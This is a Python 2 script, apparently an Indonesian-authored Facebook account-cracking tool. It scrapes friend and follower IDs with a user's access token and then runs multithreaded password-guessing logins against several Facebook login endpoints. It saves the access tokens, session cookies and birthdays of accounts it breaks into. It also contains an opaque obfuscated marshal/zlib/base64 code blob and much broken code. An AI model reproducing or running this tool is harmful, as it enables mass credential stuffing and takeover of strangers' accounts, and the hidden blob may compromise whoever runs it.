# coding=utf-8
# OPEN SOURCE CODE
# LU BUKAN PROGRAMER SEJATI KALO LU GANTI AUTHOR ASLINYA
### AUTHOR JEECK X NANO, ROMZ, MR.RISKY, XENZI, YUMASAA, AANGCYBER X <<<<<<<<<< HEKER
########### IMPORT MODULE NGAB
import os
try:
    import requests
except ImportError:
    print("%s[•] Mudule requests belum terinstall"%(p))
    os.system('pip2 install requests')
try:
    import concurrent.futures
except ImportError:
    print("%s[•] Mudule futures belum terinstall"%(p))
    os.system('pip2 install futures')
try:
    import bs4
except ImportError:
    print("%s[•] Mudule bs4 belum terinstall"%(p))
    os.system('pip2 install bs4')
import requests, os, re, bs4, sys, json, time, random, datetime
import requests,sys,os,time,json
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from datetime import datetime
from bs4 import BeautifulSoup
from time import sleep as jeda
from datetime import datetime
from calendar import monthrange
import requests,bs4,sys,os,random,time,re,json
import calendar
import requests,bs4,sys,os,subprocess,time,datetime
import requests,sys,random,re,base64,json
from multiprocessing.pool import ThreadPool
from datetime import datetime
from datetime import date 
from concurrent.futures import ThreadPoolExecutor
from multiprocessing.pool import ThreadPool
from bs4 import BeautifulSoup as parser
import os, sys, re, time, json, requests, random, datetime
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import ConnectionError
from bs4 import BeautifulSoup as parser
from time import sleep
import requests as req
import requests as re
import time,random,json
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,calendar,requests,mechanize,bs4,sys,os,subprocess,uuid,requests,sys,random,time,re,base64,json,platform
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
from random import random as acak
from random import choice as pilih
from random import randint
import requests, os, re, bs4, sys, json, time, random, datetime, subprocess, logging, base64, marshal
from concurrent.futures import ThreadPoolExecutor as celeng 
from datetime import datetime
from bs4 import BeautifulSoup as parser
from time import sleep as jeda
ct = datetime.now()
n = ct.month
bulan1 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
reload(sys)
sys.setdefaultencoding('utf-8')

########### BUAT WARNA NGAB
p = '\033[0;00m' 
J = '\033[0;33m'
S = '\033[0;00m'
N = '\x1b[0m' 
I ='\033[0;32m'
C ='\033[0;36m'
M ='\033[0;31m'
U ='\033[0;33m'
K ='\033[0;33m'
#P='\033[0;37m'
P='\033[00m'
h='\033[0;90m'
Q="\033[00m"
kk='\033[0;32m'
ff='\033[1;35m'
G='\033[0;36m'
p='\033[00m'
h='\033[0;90m'
Q="\033[00m"
i='\033[0;32m'
mm='\033[0;36m'
m='\033[0;31m'
O ='\033[0;33m'
H='\033[0;33m'
B ='\033[1;36m'
#P='\033[0;37m'
k='\033[00m'
h='\033[0;90m'
Q="\033[00m"
kk='\033[0;32m'
ff='\033[1;35m'
R='\033[0;36m'                                                                                                              
h='\033[0;90m'
W="\033[0;00m"
i='\033[0;32m'
mm='\033[0;36m'
m='\033[0;31m'
p='\033[0;00m'
c='\033[0;32m'
C='\033[0;32m'
O ='\033[0;33m'
H='\033[0;33m'
G ='\033[0;36m'
p = '\033[0;00m'
b = '\033[0;36m'                                          
m = '\033[0;31m'
N = '\x1b[0m'                                              
I ='\033[1;32m'
k ='\033[0;33m'
o ='\033[0;35m'                                           
U ='\033[0;33m'
K ='\033[0;33m'
### BUAT STR
ok = []
cp = []
id = []
user = []
loop = 0
##### BUAT KATA KATA JALAN
def jalan(z):
    for e in z + "\n" :
        sys.stdout.write(e)
        sys.stdout.flush();jeda(0.03)
#### LOGO ANAK GANTENK
def banner():
    print("""
%s_______________  ___________ __________ ⓙⓔⓔⓒⓚ
______  /___   |/  /___  __ )___  ____/
___ _  / __  /|_/ / __  __  |__  /_
/ /_/ /  _  /  / /  _  /_/ / _  __/
\____/   /_/  /_/   /_____/  /_/

%s[•]%s---------------------------------------------------%s[•]
%s |
%s[•] AUTHOR : %sMR.JEECK%s MR.RISKY,XENZI,ROMZ,YUMASAA,AANG
[•] GITHUB : https://github.com/Jeeck-XN
[•] WHATSAPP : +6281392505882
%s |------------------"""%(B,p,B,p,B,p,B,p,B))

### BUAT LOGIN TOKEN
_=(lambda x:x);code=type(_.func_code);_.func_code=code(0,0,5,64,'y9\x00e\x00\x00d\x00\x00\x83\x01\x00j\x01\x00e\x00\x00d\x01\x00\x83\x01\x00j\x02\x00e\x00\x00d\x02\x00\x83\x01\x00j\x03\x00d\x03\x00\x83\x01\x00\x83\x01\x00\x83\x01\x00d\x04\x00\x04UWn\x1e\x00\x04e\x04\x00k\n\x00rY\x00\x01Z\x05\x00\x01e\x06\x00e\x05\x00\x83\x01\x00GHn\x01\x00Xd\x04\x00S',('marshal', 'zlib', 'base64', 'eJydVt1PG0cQn+MjAQP5TgilDxtVaUlTY4OxCUlpcjGIEMAgcBQahNByuz4v9+Xc7sk4gipq+tiHPJAqD3mo2qhSpD72D+lrX/2XdHaNmxSRRqlPtzM7s/ObndHu7+zA4a8b3zv4yr9wED3AAbgFOx3AAJgFzzrgmQWsAwpvHZ3AutqO7vc5TkCBnQTWg6IXWApFH7B+FAPATqE4DewMFB51mtguYGfBtXTgo+625Ryw88AuALsIbpdxnWi7LgEbBHYZ3E5jP9m2D7VBeoB9Aj8APMLcw7DWO/IpVufqev88J22j3Hi1Z8shVHbTle20E4Uhd5SIwvQ2DVldMFUVpIQtufMKm9PfXidFkK6G4q0h5EobVC8aZteLs4uLs6WyHDwG93FCfaEa8gr6HO77o8XyKmUish2HS1nmTjWM/Mht3FubWbHlhWMQVKPG5XfoKEWeoMVcOpvN5EezZCQ7OTqevUZW4qgifJ5Zmp9ZSY+PjpFiFFaEm8RUh2eKizPF9Bial6InwvepibVrNZ8/5NsLQmUmxrPXycjCvfLS4lfEFx4nc9zxomtkjVZoLFr+W5syhVtIJI/T1OWhMgVRhBFOK89uul6vpytRHKST2OehEzHOTMewFoURphClT96icHksz7RrrSpVS/PQFSGXw2hcQd1NQkokV4KSWemQICY7HHclL6H/Lg1dUl5eXlwjpW9tMjdH7s6Wicyb0NgVBEtgXFIScF9UqSJewmhqJVGJJI4IlQbeSVD4iUfJzWtS34Q1qhKiaLBNq0RqXdKAIkzo0pCwhKZsL2lFezRIiBlaYEwYkAyCLGAi4mPTSIDLQoLJRYroSCakCAVp6K0rLJ56Qgn5hW5GQjAFNsgl23UaeriJmsDsZqnHPeJh+3xiNvnQq5uHbBB74QEpzpfKNpmZb72luTl74dC2Zi9hYx48xGF+yS7Z5K5dmiOb8icEab74jeDbPPixefC0efD8HeX3tv6uRSup5oufmy+eN1/82jx4ZUyvmwffE2Jmf5iVqLxuzTHmJQa8wSxv0EvMigMT9fKYeUuXZ3FrxC6X7eLC7CpZJyW7tEycNlnpt6gJa94CaAyBMjyFDIXEs4O3H2Af2xNmoEt1gJeC+D5YlqU6NT0hNViqC3a6DVHpyQkdYIUWrKuTsG+B6oH9DsDbvN+pyW2/C1QKdvo0n+11wSBS2uCehbIHJcCgwWgt6IX3OFKw1/lxjj7QhmNzqP5jHf1wxDDw1mAIV52CS+9Uf/rd6pHp10b0HSzJUzgyqmhGRR4PR9WuUthliOUajsMb2Vu5QrBhZD64fjjfNDIXkMUILy4eYZf6pEalEvrgGyBCPSUqJIMyQVOCd8snc8vLM/KiRg9IOq6QI3lPoyc/mZvIT+azk9kbuYmpMcMJmiPkzUzGjWmtOlqhDt+OIm/UiYKMPI/+DGqBpqXM7QB5FSlq2pT1OTU8u2UyTMvp/4Y6kvk40A8gjGWz2dx4fnIyN1XITeX/B0Ihm8sVxguT2cn8VGHi2D0sfFwVmtPlbZkEAY0b0ypO+JGufADv6I4+iDeCeFflRvPpL5vkPjUM6ic1SiqR70d1MidUNdkmNFHVKJZX9b3fZW46quGR+WcbZo1Jf18Tf3q9NKLPBp5kAL3SKDGnDG8wwPzybBxHsfm6mA8FsgCuk3jWkTMaUvHABGAnE6U/ZF6EaswZ2k+2pqoe+S2dxioZZ8gJOsHjhEslTXAN8ZBR9OqwlYn6yNz6qngjem6MugftZYEBMbkUomr0RqRksk1XdTG6T63BnNWMZA6NWcZ+4ozWGuozNG1tbZnyUe6GNIxQ+rRODw27uyhMhV9qEKvTGrIGrJQ10NFnnTh8rqCt/ZzF5xQMWKUR3QKzR6li06MY//5ErV5oFT9sxlzFBvPWCqcaCYev9qG6qr/qqwN60ASyOvivWt5bkO7F10HEEp9/o5tm/lEo65w1bF3G8W/zgedj', None),('__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'str'),(),'lambda.py','<module>',1,'\x03\x009\x01\x0f\x00',(),());_()
def masuk():
    os.system('clear');banner()
    print("%s[1] Login menggunakan token"%(p))
    print("[2] Cara mendapatkan token")
    print("%s | "%(B))
    jeck = raw_input("%s[•] Input "%(p))
    if jeck in(""):
    	jalan("[•] Isi dengan benar");exit()
    elif jeck in ('1','01'):
        jalan("\n%s[•] Masukan token untuk menghubungkan akun ke server"%(p))
    	jeeck = raw_input("\n[•] Masukan token : ")
        if jeeck in(""):
        	jalan("%s[•] Isi token yang benar celeng"%(m));exit()
    	try:
            nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(jeeck)).json()['name']
            jalan("%s[•] Login berhasil broo"%(B))
            open('data/token.txt', 'w').write(jeeck);___Jeeck___xnano___lawack___xnxx___()
        except (KeyError,IOError):
                jalan("%s[•] Token modar dinggo wae"%(m));masuk()
    elif jeck in ('2', '02'):
    	 jalan("%s | "%(B))
         jalan("%s[•] Anda akan di arahkan ke youtube"%(p))
         os.system("xdg-open https://youtu.be/p4MjQCD0ej4");exit()

#### BUAT MENU
def menu():
    os.system('clear')
    try:
    	jeeckxd = open('data/token.txt', 'r').read()
    except IOError:
        print("[•] Token modar dinggo wae");os.system("rm -rf data/token.txt");masuk()
    try:
        r = requests.get('https://graph.facebook.com/me?access_token='+jeeckxd,headers=header)
        a = json.loads(r.text)
        nama = a["name"]
        id = a["id"]
        IP = requests.get('https://api.ipify.org').text
    except KeyError:
        print("[•] Token kadaluarsa dinggo wae");os.system("rm -rf data/token.txt");masuk()
    except requests.exceptions.ConnectionError:
        print("[•] Koneksi buruk");exit()
    banner()
    print("%s[•] Username       %s:       %s%s "%(P,B,B,nama))
    print("%s[•] Userid         %s:       %s%s "%(P,B,B,id))
    print("%s[•] Ipaddress      %s:       %s%s "%(P,B,B,IP))
    print("%s |--------------------------------------------- "%(B))
    print("%s[1] Crack id dari teman / publik "%(P))
    print("[2] Crack id dari publik massall")
    print("[3] Crack id dari publii massall %sakun new"%(b))
    print("%s[4] Crack id dari followers"%(p))
    print("%s[5] Seting useragent"%(P))
    print("[6] Chek hasil crack")
    print("[7] Chek opsi akun chekpoint")
    print("%s[0] Log Out"%(m))
    print("%s | "%(B))
    pantek = raw_input("%s[•] Input : "%(P))
    if pantek == '':
        jalan("%s[•] Isi dengan benar celeng "%(m));menu()
    elif pantek in['1','01']:
        publik(jeeckxd)
    elif pantek in['2','02']:
        sunatmasal()
    elif pantek in['3','03']:
        muda_()
    elif pantek in['4','04']:
        followers()
    elif pantek in['5','05']:
    	useragent()
    elif pantek in['6','06']:
    	try:
            dirs = os.listdir("dapet")
            for file in dirs:
#                print("%s | "%(B))
                print("%s[•] File __/--> %s%s "%(P,b,file))
            print("%s | "%(B))
            pel= raw_input("%s[•] Masukan file : "%(B))
            if pel == "":
                print("[•] File tidak di temukan")
            total = open("dapet/%s"%(file)).read().splitlines()
            jalan("%s ------------------------------------------------------"%(B))
            nm_file = ("%s"%(file)).replace("-", " ")
            print("%s[•] Total akun : %s "%(p,len(total)))
            print("%s | %s"%(B,p))
            for akun in total:
            	fb = akun.replace("\n","")
                tling  = fb.replace(" +--> ", " +-->").replace(" +-->", " +--> ")
                print(tling);jeda(0.03)
            print("%s | "%(B))
            raw_input("%s [•] Tekan enter untuk kembali"%(p));menu()
        except (IOError):
            print("%s | "%(B))
            print("%s[•] Tidak ada hasill"%(p))
            print("%s | "%(B))
            raw_input("%s[•] Tekan enter untuk kembali kemenu"%(p));menu()
    elif pantek in['7','07']:
        cek_file()
        cek_opsi()
    elif pantek in['0','00']:
    	print ('')
        os.system('rm -rf data/token.txt')
        print("berhasil di hapus");exit()


#### MASSALL AKUN MUDA 
def muda_():
    try:
        tempik = open('data/token.txt','r').read()
    except (IOError):
        print("%s[•] Eror token modar dinggo wae");exit()
    try:
        print("%s | "%(B))
        print("%s[•] Mau dump berapa id silahkan di isi"%(p))
        tae = int(raw_input("[•] Masukan jumlah id : "))
    except:
        tae = 1
    peli = raw_input("[•] Buat file : ")
    for zx in range(tae):
        zx +=1
        id = raw_input("[•] Masukan user id %s%s : "%(b,zx))
        if id in ['',' ']:
            print("%s[•] Jangan kosong"%(m));exit()
        try:
            rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(id,tempik)).json()
            file = open(peli , 'a')
            for a in rex['friends']['data']:
                if a['id'][:5] in ['10005','10006','10007','10008']:
                    file.write(a['id']+"<=>"+a['name']+'\n')
                    print("\r%s[•] %s%s %s%s %s%s "%(p,b,str(len(file)),i,a["name"],o,a["id"])),
                #    print("\r%s[•] %s%s %s%s %s%s "%(p,b,len(kon),i,a["name"],o,a["id"])),
                    sys.stdout.flush();jeda(0.0050)
                    print("")
            file.close()
            kon = open(peli,'r').readlines()
            print("%s | "%(B))
            print("%s | "%(B))
            print("%s[•] Total pengumpulan id : %s%s "%(P,B,len(kon)))
            print("[•] File tersimpan di : %s%s "%(B,peli))
            print("%s | "%(B))
            raw_input("%s[•] Tekan enter "%(P));_start().ss()
        except (KeyError):
            print("%s[•] Gagal dump id"%(m));exit()
        except (ConnectionError):
            print("%s[•] Koneksi eror"%(m))
#### BUAT DUMP ID MASSALL
def sunatmasal():
	try:
		lil=open('data/token.txt', 'r').read()
	except I0Error:
		print("%s | "%(B))
                print("%s[•] Token modar dinggo wae tolol"%(p));exit()
	try:
		print("%s | "%(B))
                print("%s[•] Anda bisa ketikan %s Me %suntuk dump id pertemanan sendiri"%(p,b,p))
                print("%s[•] Ini adalah fitur dump idsecara massall"%(k))
		tr = int(raw_input("%s[•] Mau dump berapa id : "%(p)))
	except:
		tr = 1
        print("%s | "%(B))
	il = raw_input("%s[•] Buat file : "%(p))
	for zx in range(tr):
		zx += 1
		id=raw_input("%s[•] Userid %s%s : "%(p,b,zx))
		try:
			rex=requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(id,lil))
			ex=json.loads(rex.text)
			file = open(il , 'a')
			id = []
			for a in ex['friends']['data']:
				id.append(a['id']+"<=>"+a['name'])
				file.write(a['id']+"<=>"+a['name']+'\n')
#				print("\r%s[•] Mengumpulkan id >>> %s%s %s<<< --  >>>> %s%s%s <<<<"%(p,b,len(id),p,b,a["name"],p)),
                                print("\r%s[•] %s%s %s%s %s%s "%(p,b,str(len(id)),i,a["name"],o,a["id"])),
                                sys.stdout.flush();jeda(0.0050)
                                print("")
		except KeyError:
			print("[•] Mungkin id tersebut privat / akun mati");exit()
	file.close()
	__id=open(il, 'r').readlines()
        print("%s| "%(B))
	print("%s[•] Total id hasil dump >>>>%s %s %s<<<<"%(p,b,len(__id),p))
        print("[•] File hasil dump tersimpan di : %s%s"%(B,il));_start().ss()
# DUMP PUBLIK
def publik(jeeckxd,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
    	print("%s | "%(B))
        print("%s[•] Ketikan %sMe%s Untuk dump pertemanan sendiri"%(p,b,p))
        idt = raw_input("[•] Masukan id target : ")
        gas = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt,jeeckxd))
        nm = json.loads(gas.text)
        file = ('dump/'+nm['first_name']+'.json').replace(' ', '_')
        _sed_ = open(file, 'w')
        r = requests.get('https://graph.facebook.com/%s?fields=friends.limit(5001)&access_token=%s'%(idt,jeeckxd))
        z = json.loads(r.text)
        for a in z['friends']['data']:
            id.append(a['id'] + '<=>' + a['name'])
            _sed_.write(a['id'] + '<=>' + a['name'] + '\n')
#            print("\r%s[•] >>>> %s%s%s <<<< - >>>> %s%s%s <<<< - >>>> %s%s%s <<<<\n"%(p,b,str(len(id)),p,b,a["name"],p,b,a["id"],p)),
            print("\r%s[•] %s%s %s%s %s%s \n"%(p,b,str(len(id)),i,a["name"],o,a["id"])),
            sys.stdout.flush();jeda(0.0050)

        _sed_.close()
        print("%s | "%(B))
        print("%s[•] File dump tersimpan di : %s%s"%(p,b,file));_start().ss()
#        raw_input("%s[•] Tekan enter"%(p));menu()
    except Exception as e:
        print("[•] GAGAL DUMP ID TODD");exit()
# DUMP FOLLOWERS
def followers(jeeck,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
        print("%s | "%(B))
    	print("%s[•] Ketikan %sMe%s untuk dump followers sendiri"%(p,b,p))
        idt = raw_input("[•] Id target : ")
        batas = raw_input("[•] Maksimal ambil : ")
        gas = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt,jeeckxd))
        nm = json.loads(gas.text)
        file = ('dump/'+nm['first_name']+'.json').replace(' ', '_')
        _sed_ = open(file, 'w')
        r = requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s'%(idt,batas,jeeckxd))
        z = json.loads(r.text)
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            _sed_.write(a['id'] + '<=>' + a['name'] + '\n')
            print("\r%s[•] Mengumpulkan id >>>> %s%s%s <<<<"%(p,b,str(len(id)),p)),
            sys.stdout.flush();jeda(0.0050)
        _sed_.close()
        print("%s | "%(B))
        print("%s | "%(B))
        print("%s[•] File dump tersimpan di : %s%s"%(p,b,file));_start().ss()
    except Exception as e:
        print("[•] Gagal dump id");exit()
        
#### SETING USER AGENT
def useragent():
	print("%s | "%(B))
        print("%s[1] Ganti useragent"%(p))
        print("%s[0] Kembali"%(m))
        print("%s | "%(B))
	pil = raw_input("%s[•] Input : "%(p))
        if pil == "":
           print("[•] Isi dengan benar");exit()
        elif pil in("1", "01"):
            try:
                kontol = raw_input("[•] Masukan useragent : ")
                if kontol in(""):
                   print(" Masukan ua dengan benar celeng");exit()
                   open("data/ua.txt","w").write(ua_)
                open("data/ua.txt","w").write(ua);jeda(2);menu()
            except KeyboardInterrupt:
                             print("[•] Eror ");exit()
        elif pil in("0","00"):
             menu()
        else:
             print("[•] Isi dengan benar");menu()
             
class _start():
    def _init_(self):
        self.id = []
    
    def ss(self):
        try:
            print("%s | "%(B))
            self.apk = raw_input("%s[•] Masukan file : "%(p))
            self.id = open(self.apk).read().splitlines()
            print("[•] Jumlah id > %s%s%s <"%(B,len(self.id),p))
        except:
            print("[•] Isi dengan benar celeng celenk")
        ban = raw_input("[•] Ingin menggunakan password manual / otomatis %sM/O %s: "%(B,p))
        if ban in ('m', 'M'):
            print("[•] Contoh password manulan %ssayang,asu123"%(B))
            while True:
                pasx = raw_input("%s[•] Buat password : "%(p))
                if pasx == '':
                    print("%s[•] Isi dengan benar dan jangan kosong"%(m))
                elif len(pasx)<=5:
                    print("[•] Password minimal 6 karakter")
                else:
                    def xxh(mex=None):
                        print("%s | "%(B))
                        itil = raw_input("%s[•] Input "%(p))
                        if itil in(""):
                            print '%s%s isi yg benar sayang'%(M,til);self.xxh()
                        elif itil in("1","01"):
                            print("[•] Hasil crack %s OK %sdi simpan di file %s+--)%s OK-%s-%s-%s.txt"%(B,p,b,p,ha,op,ta))
                            print("[•] Hasil crack %s CP %sdi simpan di file %s+--)%s CP-%s-%s-%s.txt"%(B,p,b,p,ha,op,ta))
                            print("%s[•]%s Jika crack sudah melebihi 500 aktifkan mode pesawat 1kali"%(p,b))
                            with celeng(max_workers=30) as crack:
                                for uh in self.id:
                                    try:
                                        ah = uh.split('<=>')[0]
                                        crack.submit(self.api, ah, mex)
                                    except: pass
                            os.remove(self.apk)
                            print("[•] crack berhenti ");exit()
                        elif itil in("2","02"):
                            print("[•] Hasil crack %s OK %sdi simpan di file %s+--)%s OK-%s-%s-%s.txt"%(B,p,b,p,ha,op,ta))
                            print("[•] Hasil crack %s CP %sdi simpan di file %s+--)%s CP-%s-%s-%s.txt"%(B,p,b,p,ha,op,ta))
                            print("%s[•] %sJika crack sudah melebihi 500 aktifkan mode pesawat 1kali"%(p,b))
                            with celeng(max_workers=30) as crack:
                                for uh in self.id:
                                    try:
                                        ah = uh.split('<=>')[0]
                                        crack.submit(self.mbasic, ah, mex)
                                    except: pass
                            os.remove(self.apk)
                            print("%s[•] Crack berhenti"%(m));exit()
                        elif itil in("3","03"):
                            print("[•] Hasil crack %s OK %sdi simpan di file %s+--)%s OK-%s-%s-%s.txt"%(B,p,b,p,ha,op,ta))
                            print("[•] Hasil crack %s CP %sdi simpan di file %s+--)%s CP-%s-%s-%s.txt"%(B,p,b,p,ha,op,ta))
                            print("%s[•] %sJika crack sudah melebihi 500 aktifkan mode pesawat 1kali"%(p,b))
                            with celeng(max_workers=30) as crack:
                                for uh in self.id:
                                    try:
                                        ah = uh.split('<=>')[0]
                                        crack.submit(self.mobile, ah, mex)
                                    except: pass
                            os.remove(self.apk)
                            print("%s[•] Crack berhenti "%(m));exit()
                        else:
                            print("%s[•] Isi dengan benar"%(m));exit()
                    print("%s | "%(B))
                    print("%s[1] B-Api"%(p))
                    print("[2] Mbasic")
                    print("[3] Mobile %sNew Update"%(b))
                    xxh(pasx.split(','))
                    break
        elif ban in ('o', 'O'):
            print("%s | "%(B))
            print("%s[1] B-Api"%(p))
            print("[2] Mbasic")
            print("[3] Mobile %sNew Update "%(b))
            self.crack()
        else:
            print("[•] Isi dengan benar celeng celenk ");menu()
        return

    def b_api(self, user, xxh):
    	try:
    	    ua = open('data/ua.txt', 'r').read()
        except IOError:
                ua = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"])
        global ok,cp,loop
        for pw in xxh:
            pw = pw.lower()
            ses = requests.Session()
            header = {"user-agent": ua,
            "x-fb-connection-bandwidth": str(random.randint(20000,40000)),
            "x-fb-sim-hni": str(random.randint(20000,40000)),
            "x-fb-net-hni": str(random.randint(20000,40000)),
            "x-fb-connection-quality": "EXCELLENT",
            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
            "content-type": "application/x-www-form-urlencoded",
            "x-fb-http-engine": "Liger"}
            bapi = "https://b-api.facebook.com/method/auth.login"
            response = ses.get(bapi+'?format=json&email='+user+'&password='+pw+'&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header)
            if response.status_code != 200:
            	loop +=1
            	print("\r%s[+] Ip terbelokir hidupkan mode pesawat 3/2 detik"%(m)),
                sys.stdout.flush()
                b_api(self, user, xxh)
            if 'session_key' in response.text and 'EAAA' in response.text:
                print ('\r %s+--> %s | %s | %s   ' % (B,user,pw,response.json()['access_token']))
                wrt = '%s|%s|%s ' % (user,pw,response.json()['access_token'])
                ok.append(wrt)
                open('dapet/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    jeeckxd = open('data/token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,jeeckxd)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r %s+--> %s | %s | %s %s %s ' % (K,user,pw,day,month,year)
                    wrt = '%s|%s|%s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('dapet/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except KeyError:
                    day = ''
                    month   = ''
                    year  = ''
                except: pass
                print '\r %s+--> %s | %s           ' % (K,user,pw)
                wrt = '%s|%s' % (user,pw)
                cp.append(wrt)
                open('dapet/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
        loop += 1
        print("\r %s[%s+++++++++%s] %s--%s [OK-->%s]----++[CP-->%s]"%(P,B,P,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
    def basic(self, user, xxh):
        try:
    	    ua = open('data/ua.txt', 'r').read()
        except IOError:
        	ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
        global ok,cp,loop
        for pw in xxh:
            pw = pw.lower()
            ses = requests.Session()
            ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://mbasic.facebook.com")
            b = bs4.BeautifulSoup(p.text, 'html.parser')
            dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
            data = {}
            for rom in b('input'):
            	if rom.get('value') is None:
            	    if rom.get('name') == 'email':
            	        data.update({"email":user})
                    elif rom.get("name")=="pass":
                    	data.update({"pass":pw})
                    else:
                    	data.update({rom.get('name'): ''})
                else:
                	data.update({rom.get('name'): rom.get('value')})
            data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd',
            '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
            ses.headers.update({'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8'})
            po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0', data=data).text
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print ('\r %s+--> %s | %s | %s  ' % (b,user,pw,kuki))
                wrt = ('%s|%s|%s' % (user,pw,kuki))
                ok.append(wrt)
                open('dapet/OK-%s-%s-%s.txt'% (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    jeeckxd = open('data/token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,jeeckxd)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print ('\r %s+--> %s | %s | %s %s %s ' % (K,user,pw,day,month,year))
                    wrt = ('%s|%s|%s %s %s' % (user,pw,day,month,year))
                    cp.append(wrt)
                    open('dapet/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except KeyError:
                    day = ''
                    month   = ''
                    year  = ''
                except: pass
                print ('\r %s+--> %s | %s           ' % (K,user,pw))
                wrt = ('%s|%s' % (user,pw))
                cp.append(wrt)
                open('dapet/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
        loop += 1
        print("\r %s[%s+++++++++%s] %s--%s [OK-->%s]----++[CP-->%s]"%(P,B,P,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
    def mobile(self, user, xxh):
        try:
    	    ua = open('data/ua.txt', 'r').read()
        except IOError:
        	ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
        global ok,cp,loop
        for pw in xxh:
            pw = pw.lower()
            ses = requests.Session()
            ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://m.facebook.com")
            b = bs4.BeautifulSoup(p.text, 'html.parser')
            dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
            data = {}
            for rom in b('input'):
            	if rom.get('value') is None:
            	    if rom.get('name') == 'email':
            	        data.update({"email":user})
                    elif rom.get("name")=="pass":
                    	data.update({"pass":pw})
                    else:
                    	data.update({rom.get('name'): ''})
                else:
                	data.update({rom.get('name'): rom.get('value')})
            data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd',
            '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
            ses.headers.update({'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8'})
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0', data=data).text
